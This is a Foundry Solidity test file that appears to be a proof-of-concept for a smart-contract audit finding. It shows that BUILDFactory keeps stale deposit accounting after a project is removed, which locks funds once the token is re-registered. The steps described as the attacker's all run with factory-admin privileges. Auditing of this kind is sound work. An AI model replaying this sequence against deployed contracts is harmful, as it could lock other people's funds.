// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// --- FOUNDRY IMPORTS ---
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

// --- PROTOCOL IMPORTS ---
import {BUILDFactory} from "src/BUILDFactory.sol";
import {BUILDClaim} from "src/BUILDClaim.sol";
import {IBUILDFactory} from "src/interfaces/IBUILDFactory.sol";

// --- DEPENDENCY IMPORTS ---
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IDelegateRegistry} from "@delegatexyz/delegate-registry/v2.0/src/IDelegateRegistry.sol";
import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol"; // <--- THE FIX: IMPORT ERRORS INTERFACE

// --- HELPER CONTRACT 1: A MINTABLE TOKEN ---
contract MintableERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {}
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

// --- HELPER CONTRACT 2: A MINIMAL DELEGATE REGISTRY STUB ---
contract StubRegistry {
    function checkDelegateForContract(
        address,
        address,
        address,
        bytes32
    ) external pure returns (bool) {
        return false;
    }
}

// --- PROOF OF CONCEPT ---
contract ProofOfConcept is Test {
    BUILDFactory public factory;
    MintableERC20 public token;
    StubRegistry public stubRegistry;
    address public factoryAdmin = makeAddr("factoryAdmin");
    address public originalProjectAdmin = makeAddr("originalProjectAdmin");
    address public attackerProjectAdmin = makeAddr("attackerProjectAdmin");

    function test_PoC_StaleStateCausesFundLock() public {
        // --- 1. SETUP ---
        stubRegistry = new StubRegistry();
        token = new MintableERC20();
        vm.prank(factoryAdmin);
        factory = new BUILDFactory(
            BUILDFactory.ConstructorParams({
                admin: factoryAdmin,
                maxUnlockDuration: 30 days,
                maxUnlockDelay: 7 days,
                delegateRegistry: IDelegateRegistry(address(stubRegistry))
            })
        );

        // --- 2. A LEGITIMATE PROJECT IS CREATED AND FUNDED ---
        console.log("--- Phase 1: A legitimate project deposits funds ---");
        vm.prank(factoryAdmin);
        IBUILDFactory.AddProjectParams[]
            memory addParams = new IBUILDFactory.AddProjectParams[](1);
        addParams[0] = IBUILDFactory.AddProjectParams({
            token: address(token),
            admin: originalProjectAdmin
        });
        factory.addProjects(addParams);

        vm.prank(originalProjectAdmin);
        BUILDClaim originalClaimContract = BUILDClaim(
            address(factory.deployClaim(address(token)))
        );

        uint256 depositAmount = 1_000_000 ether;
        token.mint(originalProjectAdmin, depositAmount);

        vm.startPrank(originalProjectAdmin);
        token.approve(address(originalClaimContract), depositAmount);
        originalClaimContract.deposit(depositAmount);
        vm.stopPrank();

        assertEq(
            token.balanceOf(address(originalClaimContract)),
            depositAmount
        );
        console.log(
            "Original claim contract now holds:",
            token.balanceOf(address(originalClaimContract))
        );

        // --- 3. THE PROJECT IS REMOVED BY THE FACTORY ADMIN ---
        console.log("\n--- Phase 2: The factory admin removes the project ---");
        vm.prank(factoryAdmin);
        address[] memory tokensToRemove = new address[](1);
        tokensToRemove[0] = address(token);
        factory.removeProjects(tokensToRemove);
        console.log("Project associated with the token has been removed.");

        // --- 4. VERIFICATION OF THE VULNERABILITY ---
        console.log("\n--- Phase 3: Verifying the broken state ---");

        // An attacker re-registers the same token address.
        vm.prank(factoryAdmin);
        IBUILDFactory.AddProjectParams[]
            memory attackParams = new IBUILDFactory.AddProjectParams[](1);
        attackParams[0] = IBUILDFactory.AddProjectParams({
            token: address(token),
            admin: attackerProjectAdmin
        });
        factory.addProjects(attackParams);

        IBUILDFactory.TokenAmounts memory amountsAfter = factory
            .getTokenAmounts(address(token));
        assertEq(
            amountsAfter.totalDeposited,
            depositAmount,
            "Vulnerability confirmed: Stale deposit data was retained!"
        );
        console.log(
            "Factory accounting still shows",
            amountsAfter.totalDeposited,
            "deposited."
        );
        assertEq(
            token.balanceOf(address(originalClaimContract)),
            depositAmount,
            "Funds are still in the old contract."
        );
        console.log(
            "Actual funds are still locked in the original claim contract:",
            address(originalClaimContract)
        );

        // --- 5. EXPLOITATION OUTCOME: PERMANENTLY LOCKED FUNDS ---
        console.log("\n--- Exploitation Outcome: Permanent Fund Lock ---");

        vm.prank(factoryAdmin);
        factory.scheduleWithdraw(
            address(token),
            attackerProjectAdmin,
            depositAmount
        );
        console.log("Attacker's admin successfully scheduled a withdrawal.");

        vm.prank(attackerProjectAdmin);
        BUILDClaim newClaimContract = BUILDClaim(
            address(factory.deployClaim(address(token)))
        );

        vm.prank(attackerProjectAdmin);
        // THE FIX: Use the correct interface to get the error selector
        vm.expectRevert(
            abi.encodeWithSelector(
                IERC20Errors.ERC20InsufficientBalance.selector,
                address(newClaimContract),
                0,
                depositAmount
            )
        );
        newClaimContract.withdraw();

        console.log(
            "SUCCESS: PoC confirmed. The withdrawal fails, proving the funds in the original contract are permanently locked."
        );
        console.log(
            "The factory's internal state can also be corrupted by this failed withdrawal attempt."
        );
    }
}
